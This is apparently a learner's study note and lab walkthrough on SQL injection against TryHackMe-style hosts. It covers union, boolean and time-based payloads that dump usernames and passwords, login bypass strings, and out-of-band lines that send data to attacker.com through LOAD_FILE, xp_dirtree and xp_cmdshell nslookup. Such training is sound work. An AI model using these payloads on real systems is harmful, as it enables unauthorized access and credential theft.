@@ -1,0 +1,272 @@
+inject your favorite drink and snack into your table and enjoy the show!
+
+SQL Injection
+ - also called SQLi
+ - very prominent and dangerous vulnerability
+
+it is assumed that you have some basic knowledge of SQL
+
+SQL essentials (before injection)
+ - comments
+    - ignore everything following on the line: --
+    - single line comment: #
+    - multi-line comment: /* ... */
+    - eg. SELECT * FROM users WHERE username='INPUT' AND password='secret';
+    - if we input admin'--
+    - we get SELECT * FROM users WHERE username='admin'
+ - UNION
+    - combine results of 2 or more SELECT statements
+    - !!! all SELECT statements must have the same number of columns and compatible data types
+    - we use it to append our own SELECT to pull data from different tables
+ - LIKE and wildcards
+    - LIKE = pattern matching
+    - any sequence of characters: %
+    - any single character: _
+    - used in blind sqli (where we can only ask true/false questions and don't see other results)
+ - information_schema database
+    - contains metadata about the database, built-in
+    - eg. tables, columns, data types, privileges, ...
+    - we can query it to find out about the database structure
+    - information_schema.tables = list of tables
+    - information_schema.columns = list of columns in tables
+    - very useful for sqli
+
+In-Band SQL Injection
+ - results of injection are directly returned
+ - Error-Based = database returns error messages that reveal information about its structure.
+ - Union-Based = we can use UNION to combine our own SELECT with the original query.
+
+Blind SQLi
+ - results are not directly displayed, we have to infer
+ - Authentication bypass = login success/failure baised on injected query
+ - Boolean-Based = we can ask true/false questions or get different responses based on a condition
+ - Time-Based = using SLEEP(), inducing a time delay and observing the response swiftness (slow = true, fast = false)
+
+Out-of-Band SQLi
+ - results are sent to a different channel (eg. email, DNS, HTTP request)
+ - less common, but can be useful when other methods fail
+
+Finding SQLi
+ - enter ' or " in input fields and observe for errors or unexpected behavior (eg. internal server error, syntax error, etc.)
+ - enter ;-- to see if comment syntax is processed
+ - try OR 1=1 (always true), if results are affected, input is directly used (bad practice)
+
+___________________________________
+In-Band SQLi
+
+Error-Based
+ - exploits error messages displayed to the user
+ - eg. raw database errors (sometimes even shows the query)
+ - try using a single quote (') or double quote (") in input fields to see if errors are returned
+
+Union-Based
+ - UNION operator to append our own SELECT
+ - workflow:
+    - find number of columns in original query, eg.:
+        - 1 UNION SELECT 1          -- error (wrong column count)
+        - 1 UNION SELECT 1,2        -- error (still wrong)
+        - 1 UNION SELECT 1,2,3      -- success! The table has 3 columns
+
+    - identify displayed columns
+
+    - extract database name
+        - replace the visible column position with database() function
+        - you can change the original query to something with no results (eg. WHERE id=0) to avoid mixing data
+        - eg. 0 UNION SELECT database(),2,3
+
+    - enumerate tables using information_schema
+        - eg. 0 UNION SELECT group_concat(table_name),2,3 FROM information_schema.tables WHERE table_schema = 'database_name'
+
+    - enumerate columns
+        - eg. 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'target_table'
+
+    - extract data
+        - we use a username:password<br> separation for better readability
+        - eg. 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM target_table
+
+___________________________________
+Blind SQLi
+
+Authentication bypass
+ - example query:
+ - SELECT * FROM users WHERE username='bob' AND password='secret123' LIMIT 1;
+ - attack (enter username: ' OR 1=1;-- and any password)
+ - the ' closes username string, 
+ - the OR 1=1 is always true (making the whole WHERE true)
+ - the semicolon ends the statement 
+ - and -- comments out the rest of the query
+ - so the resulting query is:
+ - SELECT * FROM users WHERE username='' OR 1=1;
+ - this will return all users, 
+ - and usually logs us in as the first user (often admin)
+ - you can also try for a specific user - eg. admin'-- (this will log in as admin if it exists)
+
+Variations
+' OR 1=1;-- classic bypasswhen username is wrapped in ''
+' OR 1=1# this uses # as the comment character (MySQL alternative)
+" OR 1=1-- for queries that use double quotes around the input
+
+Boolean-Based
+ - the application returns a binary signal
+ - eg. different page content, JSON response like {"success":true} vs {"success":false}, subtle HTML changes
+ - workflow
+    - we have a web https://website.thm/checkuser?username=admin
+    - let's imagine we know its query (or we are cool hacker and made it up)
+    - SELECT * FROM users WHERE username = '%username%' LIMIT 1;
+    - we know it returns {"taken":true} when a username is taken and {"taken":false} elsewhen
+
+    - confirm injection
+        - here we inject an always true condition (% matches anything)
+        - so this should definitely return {"taken":true} if injection works
+        - admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
+
+    - guess database name character by character
+        - in real world this would be too much work 
+        - we would either automate this or more realistically use some tools
+
+        - admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--
+        - false? try b%, c%, etc.
+        - when response says true, we go to next character
+        - remember to use your brain, to not try complete nonsense (or does the company have random table names ? hmm)
+
+    - get table and column names
+        - in the same way as guessing the db name
+        - please don't actually do this. It is a reliable method but don't
+        - admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'db_name' AND table_name LIKE 'a%';--
+
+Time-Based
+ - SLEEP() pauses query execution for a set number of seconds
+ - we can use it to infer true/false conditions based on response time
+ - note that using 1 second is usually too short, as network latency exists
+ - workflow
+    - find the column count (same idea as Union-Based)
+        - admin123' UNION SELECT SLEEP(5);--        -- no delay (wrong count)
+        - admin123' UNION SELECT SLEEP(5),2;--      -- 5 second delay (2 columns!)
+
+    - enumerate data (same idea as Boolean-Based)
+        - admin123' UNION SELECT SLEEP(5),2,3 WHERE database() LIKE 'a%';--
+        - if response is delayed by 5 seconds, we know the condition is true
+        - if not, we try the next character
+
+___________________________________
+Out-of-Band SQLi
+ - when everything else has failed
+ - eg. no error messages, no visible data, SLEEP() is blocked, responses look the same...
+ - BUT the database CAN make outbound connections (if not we are done - eg. strong firewall, no internet access, etc.)
+ - attack channel = your web request with the injection payload
+ - data channel = outbound network request that the db server makes to your server (containing the exfilt. data)
+
+DNS exfiltration
+ - MySQL function LOAD_FILE() to trrigger a DNS lookup
+ - the data we want is included as a subdomain
+ - SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));
+
+MSSQL Techniques
+ - Microsoft SQL Server 
+ - xp_dirtree tries to list a directory on a remote server (triggers a DNS lookup)
+    - EXEC master..xp_dirtree '\\attacker.com\share';
+ - xp_cmdshell runs a command on the server (triggers a DNS lookup)
+    - this one is usually disabled
+    - we use nslookup or curl to trigger a DNS lookup
+    - EXEC xp_cmdshell 'nslookup data.attacker.com';
+
+Receiving the data
+ - we need to set up a server to receive the DNS requests
+ - we could use Burp Collaborator, but it is not free
+ - we can use a free service like Interactsh (https://interact.sh/)
+ - or just set up a python DNS server (eg. dnslib) or an HTTP server 
+
+___________________________________
+Remediation
+
+only very shortly
+ - parameterized queries (prepared statements)
+    - use placeholders for user input
+    - database handles input separately (not as part of the query)
+
+ - input validation
+    - allowlist of valid characters, reject everything else
+ - escaping user input
+    - escape special characters (eg. ', ", \, %, _, etc.)
+    - not as secure as parameterized queries, but better than nothing
+ - principle of least privilege
+    - eg. if the app only needs to read data, don't give write or admin privileges
+    - database user should have only the necessary permissions
+ - web application firewall (WAF)
+    - can help block known attack patterns
+    - not a replacement for secure coding practices
+
+___________________________________
+Practical
+
+lvl 1 - Union-Based (In-Band)
+    - https://website.thm/article?id=1
+    - the query is: select * from article where id = <INPUT>
+    - first I tried a single quote (') and got an error, so it executes
+    - now we find the number of columns
+    - 1 UNION SELECT 1 = error
+    - 1 UNION SELECT 1,2 = error
+    - 1 UNION SELECT 1,2,3 = success
+    - now we can extract the database name
+    - because the three appears on the page, we will use that
+    - 0 UNION SELECT 1,2,database()
+    - db = sqli_one
+    - enumerate tables
+    - we use group_concat() to get all in one go and information_schema as explained above
+    - 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='sqli_one'
+    - tables = articles, staff_users
+    - staff users –– we want that
+    - get me the columns
+    - 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='staff_users'
+    - columns = id,password,username
+    - get me the passwords
+    - 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
+    - got the passwords
+
+lvl2 - Authentication bypass
+    - https://website.thm/login
+    - query: select * from users where username='' and password='' LIMIT 1;
+    - classic bypass: ' OR 1=1;--
+    - It works! Sometimes it can be this easy.
+
+lvl3 - Boolean-Based Blind SQLi
+    - https://website.thm/checkuser?username=admin and a login form
+    - the website returns {"taken":true} when the username is taken and {"taken":false} otherwise
+    - we can do character by character, to discover the database name.
+    - starting with
+    - admin123' UNION SELECT 1,2,3 where database() like 'a%;--
+    - false, try b%, c%, d%, e%, f%, g%, h%, i%, j%, k%, l%, m%, n%, o%, p%, q%, r%
+    - s% is true, next character
+    - ...
+    - admin123' UNION SELECT 1,2,3 where database() like 'sqli_three%';--
+    - this looks like the end so delete the % and try again
+    - admin123' UNION SELECT 1,2,3 where database() like 'sqli_three';--
+    - success! we found the database name
+    - now we would do the same with table names
+    - admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_name LIKE 'u%';--
+    - let's take a very wild guess and try users
+    - admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_name LIKE 'users';--
+    - yay!
+    - column names in the same way
+    - admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_name = 'users' and column_name like 'u%';--
+    - let's guess username and password
+    - yay!
+    - now for the username 
+    - admin123' UNION SELECT 1,2,3 from users where username like 'a%';--
+    - let's guess admin
+    - yay!
+    - admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '3%';--
+    - let's ask the friendly neighborhood witch for help
+    - ..
+    - 3845
+    - yay!!
+
+lvl4 - Time-Based Blind SQLi
+ - same thing as the Boolean, so for the final query
+ - admin123' UNION SELECT SLEEP(3),2 from users where username='admin' and password like '4%';--
+ - now we would try the next character until we get delay meaning we got a correct character
+ - blah blah...
+ - that's it! we got the password for admin, and we can log in now
+
+___________________________________
+Thanks for reading!
